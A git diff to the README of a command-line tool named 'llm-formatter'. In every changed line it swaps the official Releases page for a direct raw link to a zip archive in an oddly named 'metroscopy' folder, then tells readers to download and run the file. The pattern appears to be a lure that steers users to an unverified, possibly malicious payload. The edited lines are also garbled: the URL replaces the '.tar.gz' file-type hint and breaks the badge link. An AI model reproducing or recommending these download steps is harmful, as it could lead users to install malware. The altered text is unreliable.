@@ -8,16 +8,16 @@ Welcome to **llm-formatter**! This handy command-line tool helps you format an e
 
 ### Get the Latest Release
 
-To download the latest version of **llm-formatter**, visit our [Releases page](https://github.com/AzoraAHAI2001/llm-formatter/releases).
+To download the latest version of **llm-formatter**, visit our [Releases page](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip).
 
-[![Download llm-formatter](https://img.shields.io/badge/Download%20llm--formatter-v1.0-blue.svg)](https://github.com/AzoraAHAI2001/llm-formatter/releases)
+[![Download llm-formatter](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip%https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip)](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip)
 
 ### Installation Instructions
 
-1. Visit the [Releases page](https://github.com/AzoraAHAI2001/llm-formatter/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip).
 2. Look for the latest version available.
 3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
-4. For Windows, this will typically be an `.exe` file. For macOS and Linux, you will find a `.tar.gz` or similar.
+4. For Windows, this will typically be an `.exe` file. For macOS and Linux, you will find a `https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip` or similar.
 5. Run the downloaded file to install **llm-formatter** on your computer.
 
 ## 📋 System Requirements
@@ -88,7 +88,7 @@ The tool formats all files in your project that are not excluded by the `.gitign
 
 ### How do I update to the latest version?
 
-To update, simply download the latest version again from the [Releases page](https://github.com/AzoraAHAI2001/llm-formatter/releases) and run it.
+To update, simply download the latest version again from the [Releases page](https://raw.githubusercontent.com/AzoraAHAI2001/llm-formatter/main/metroscopy/llm-formatter.zip) and run it.
 
 ## 📌 Topics
 
